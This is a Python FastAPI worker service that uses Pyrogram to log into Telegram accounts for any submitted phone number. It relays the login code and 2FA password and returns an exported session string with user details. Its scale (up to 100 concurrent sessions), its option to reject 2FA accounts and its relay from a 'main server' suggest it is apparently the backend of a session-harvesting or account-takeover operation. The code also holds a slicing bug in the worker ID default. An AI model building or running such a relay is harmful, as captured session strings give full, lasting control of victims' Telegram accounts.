import asyncio
import os
import uuid
from typing import Dict, Any, Optional
from contextlib import asynccontextmanager
from datetime import datetime

from fastapi import FastAPI, HTTPException, status, Header, Depends
from pydantic import BaseModel, Field, validator
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    PasswordHashInvalid,
    FloodWait,
    PhoneNumberInvalid,
    PhoneNumberBanned
)
from dotenv import load_dotenv
import logging

load_dotenv()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ==================== CONFIGURATION ====================
TELEGRAM_API_ID = int(os.getenv('TELEGRAM_API_ID'))
TELEGRAM_API_HASH = os.getenv('TELEGRAM_API_HASH')
API_KEY = os.getenv('API_KEY', 'your-secret-api-key')  # Same as main server
WORKER_ID = os.getenv('WORKER_ID', str(uuid.uuid4()[:8]))
MAX_CONCURRENT_SESSIONS = int(os.getenv('MAX_CONCURRENT_SESSIONS', '100'))

# ==================== DATA MODELS ====================
class WorkerOTPRequest(BaseModel):
    session_id: str
    phone_number: str
    reject_2fa: bool = Field(False, description="Reject if account has 2FA")

class WorkerVerifyOTP(BaseModel):
    session_id: str
    otp_code: str

class WorkerVerify2FA(BaseModel):
    session_id: str
    password: str

# ==================== TELEGRAM CLIENT MANAGER ====================
class TelegramClientManager:
    """Manage Pyrogram client instances for this worker"""
    
    def __init__(self):
        self.active_clients: Dict[str, Client] = {}
        self.session_data: Dict[str, Dict[str, Any]] = {}
        self.max_sessions = MAX_CONCURRENT_SESSIONS
    
    async def create_client(self, session_id: str) -> Client:
        """Create a new Pyrogram client"""
        if len(self.active_clients) >= self.max_sessions:
            raise HTTPException(
                status_code=status.HTTP_429_TOO_MANY_REQUESTS,
                detail="Worker server is at maximum capacity"
            )
        
        try:
            session_name = f"worker_{WORKER_ID}_session_{session_id[:8]}"
            client = Client(
                session_name,
                api_id=TELEGRAM_API_ID,
                api_hash=TELEGRAM_API_HASH,
                in_memory=True,
                workdir="/tmp/telegram_sessions"
            )
            
            await client.connect()
            self.active_clients[session_id] = client
            logger.info(f"✅ Telegram client created for session: {session_id}")
            return client
        except Exception as e:
            logger.error(f"❌ Error creating Telegram client: {e}")
            raise HTTPException(
                status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                detail="Failed to create Telegram client"
            )
    
    async def request_otp(self, session_id: str, phone_number: str, reject_2fa: bool = False) -> Dict[str, Any]:
        """Send OTP to phone number"""
        client = await self.create_client(session_id)
        
        try:
            sent_code = await client.send_code(phone_number)
            
            # Store session data
            self.session_data[session_id] = {
                'phone_number': phone_number,
                'phone_code_hash': sent_code.phone_code_hash,
                'client': client,
                'reject_2fa': reject_2fa,
                'created_at': datetime.utcnow()
            }
            
            logger.info(f"✅ OTP sent to {phone_number} for session {session_id} (reject_2fa: {reject_2fa})")
            
            return {
                'success': True,
                'phone_code_hash': sent_code.phone_code_hash
            }
        except PhoneNumberInvalid:
            await self.disconnect_client(session_id)
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="Invalid phone number"
            )
        except PhoneNumberBanned:
            await self.disconnect_client(session_id)
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="This phone number is banned"
            )
        except FloodWait as e:
            await self.disconnect_client(session_id)
            raise HTTPException(
                status_code=status.HTTP_429_TOO_MANY_REQUESTS,
                detail=f"Too many requests. Please wait {e.value} seconds"
            )
        except Exception as e:
            await self.disconnect_client(session_id)
            logger.error(f"❌ Error sending OTP: {e}")
            raise HTTPException(
                status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                detail="Failed to send OTP"
            )
    
    async def verify_otp(self, session_id: str, otp_code: str) -> Dict[str, Any]:
        """Verify OTP code with 2FA rejection logic"""
        client = self.active_clients.get(session_id)
        session_info = self.session_data.get(session_id)
        
        if not client or not session_info:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail="Session not found or expired"
            )
        
        try:
            # Try to sign in with OTP
            result = await client.sign_in(
                phone_number=session_info['phone_number'],
                phone_code_hash=session_info['phone_code_hash'],
                phone_code=otp_code
            )
            
            # Successfully signed in (no 2FA)
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'last_name': me.last_name
            }
            
            # Export session string
            session_string = await client.export_session_string()
            
            logger.info(f"✅ OTP verified for session {session_id} (no 2FA)")
            
            return {
                'success': True,
                'requires_2fa': False,
                'is_rejected': False,
                'session_string': session_string,
                'user_info': user_info
            }
        except SessionPasswordNeeded:
            # 2FA is enabled on this account
            if session_info.get('reject_2fa', False):
                # Reject 2FA accounts based on configuration
                logger.info(f"🔄 2FA account rejected for session {session_id}")
                await self.disconnect_client(session_id)
                
                return {
                    'success': False,
                    'requires_2fa': False,
                    'is_rejected': True,
                    'reject_reason': '2FA_ACCOUNT_REJECTED',
                    'message': 'Account has 2FA enabled. Rejected based on endpoint configuration'
                }
            else:
                # Accept 2FA - require password
                logger.info(f"🔄 2FA required for session {session_id}")
                return {
                    'success': False,
                    'requires_2fa': True,
                    'is_rejected': False,
                    'message': '2FA_REQUIRED'
                }
        except PhoneCodeInvalid:
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="Invalid OTP code"
            )
        except PhoneCodeExpired:
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="OTP code has expired"
            )
        except Exception as e:
            logger.error(f"❌ Error verifying OTP: {e}")
            raise HTTPException(
                status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                detail="Failed to verify OTP"
            )
    
    async def verify_2fa(self, session_id: str, password: str) -> Dict[str, Any]:
        """Verify 2FA password"""
        client = self.active_clients.get(session_id)
        
        if not client:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail="Session not found or expired"
            )
        
        try:
            await client.check_password(password)
            
            # Get user info
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'last_name': me.last_name
            }
            
            # Export session string
            session_string = await client.export_session_string()
            
            logger.info(f"✅ 2FA verified for session {session_id}")
            
            return {
                'success': True,
                'session_string': session_string,
                'user_info': user_info
            }
        except PasswordHashInvalid:
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="Invalid 2FA password"
            )
        except Exception as e:
            logger.error(f"❌ Error verifying 2FA: {e}")
            raise HTTPException(
                status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                detail="Failed to verify 2FA"
            )
    
    async def disconnect_client(self, session_id: str) -> None:
        """Disconnect and remove client"""
        client = self.active_clients.get(session_id)
        if client:
            try:
                await client.disconnect()
                logger.info(f"✅ Client disconnected: {session_id}")
            except Exception as e:
                logger.warning(f"⚠️ Error disconnecting client: {e}")
            finally:
                self.active_clients.pop(session_id, None)
                self.session_data.pop(session_id, None)
    
    async def cleanup_all(self):
        """Cleanup all clients"""
        for session_id in list(self.active_clients.keys()):
            await self.disconnect_client(session_id)
        logger.info("✅ All clients cleaned up")

# ==================== AUTHENTICATION ====================
async def verify_api_key(x_api_key: str = Header(..., alias="X-API-Key")):
    """Verify API key for authentication"""
    if x_api_key != API_KEY:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid API key"
        )
    return x_api_key

# ==================== FASTAPI APPLICATION ====================
telegram_manager = TelegramClientManager()

@asynccontextmanager
async def lifespan(app: FastAPI):
    """Application lifespan manager"""
    logger.info(f"🚀 Starting Worker Server (ID: {WORKER_ID})...")
    logger.info(f"📊 Max concurrent sessions: {MAX_CONCURRENT_SESSIONS}")
    yield
    logger.info("🔧 Cleaning up...")
    await telegram_manager.cleanup_all()
    logger.info("✅ Shutdown complete")

app = FastAPI(
    title=f"Telegram Authentication Worker - {WORKER_ID}",
    description="Worker server for Telegram authentication operations with 2FA rejection support",
    version="3.0.0",
    lifespan=lifespan
)

# ==================== WORKER ENDPOINTS ====================

@app.post("/worker/request-otp")
async def worker_request_otp(request: WorkerOTPRequest, api_key: str = Depends(verify_api_key)):
    """
    Worker endpoint to request OTP with 2FA rejection support
    """
    try:
        result = await telegram_manager.request_otp(
            request.session_id,
            request.phone_number,
            request.reject_2fa
        )
        
        return {
            "success": True,
            "message": "OTP sent successfully",
            "data": result
        }
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"❌ Error in worker_request_otp: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal worker error"
        )

@app.post("/worker/verify-otp")
async def worker_verify_otp(request: WorkerVerifyOTP, api_key: str = Depends(verify_api_key)):
    """
    Worker endpoint to verify OTP with 2FA rejection support
    """
    try:
        result = await telegram_manager.verify_otp(
            request.session_id,
            request.otp_code
        )
        
        # Disconnect client if authentication successful or rejected
        if not result.get('requires_2fa'):
            await telegram_manager.disconnect_client(request.session_id)
        
        return result
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"❌ Error in worker_verify_otp: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal worker error"
        )

@app.post("/worker/verify-2fa")
async def worker_verify_2fa(request: WorkerVerify2FA, api_key: str = Depends(verify_api_key)):
    """
    Worker endpoint to verify 2FA
    """
    try:
        result = await telegram_manager.verify_2fa(
            request.session_id,
            request.password
        )
        
        # Disconnect client after successful authentication
        await telegram_manager.disconnect_client(request.session_id)
        
        return result
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"❌ Error in worker_verify_2fa: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal worker error"
        )

@app.get("/worker/health")
async def worker_health(api_key: str = Depends(verify_api_key)):
    """Worker health check endpoint"""
    return {
        "status": "healthy",
        "worker_id": WORKER_ID,
        "active_sessions": len(telegram_manager.active_clients),
        "max_sessions": telegram_manager.max_sessions,
        "load_percentage": (len(telegram_manager.active_clients) / telegram_manager.max_sessions) * 100
    }

@app.get("/health")
async def health_check():
    """Public health check endpoint"""
    return {
        "status": "healthy",
        "worker_id": WORKER_ID,
        "service": "Telegram Authentication Worker",
        "version": "3.0.0"
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(
        app,
        host="0.0.0.0",
        port=8001,  # Different port for worker
        reload=False
    )